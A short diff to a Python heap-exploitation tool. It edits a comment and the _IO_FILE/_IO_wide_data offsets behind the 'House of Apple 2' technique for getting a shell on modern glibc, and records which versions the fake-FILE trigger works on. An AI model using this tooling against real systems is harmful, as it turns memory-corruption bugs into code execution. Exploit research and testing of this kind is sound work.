@@ -164,7 +164,12 @@ def groom_reclaim(req: int) -> dict:
 # --- House of Apple 2: arbitrary write + libc leak -> shell on modern glibc (>= 2.34) -----------
 import struct as _struct  # noqa: E402
 
-# Fixed _IO_FILE / _IO_wide_data field offsets (stable across glibc; verified live on 2.35-2.43).
+# Fixed _IO_FILE / _IO_wide_data field offsets. Confirmed end-to-end (fake FILE -> system shell) on
+# glibc 2.36, 2.37, 2.39, 2.41 and 2.43's predecessors via the old-glibc confirmation lane
+# (tests/test_heap_oldglibc.py). glibc 2.35 is the ONE measured exception: the leak + tcache poison
+# land (the libc base is recovered), but the wide-data _IO_wfile_overflow -> __doallocate trigger
+# faults before system -- consistently, 5/5 -- so this layout holds for 2.36-2.43, NOT 2.35 (an
+# upstream "2.35+" claim this host refutes). The lane gates min_ver=2.36 accordingly.
 _F_FLAGS, _F_WRITE_BASE, _F_WRITE_PTR = 0x00, 0x20, 0x28
 _F_BUF_BASE, _F_LOCK, _F_WIDE_DATA, _F_VTABLE = 0x38, 0x88, 0xA0, 0xD8
 _WD_BUF_BASE, _WD_VTABLE = 0x30, 0xE0                 # inside the _IO_wide_data
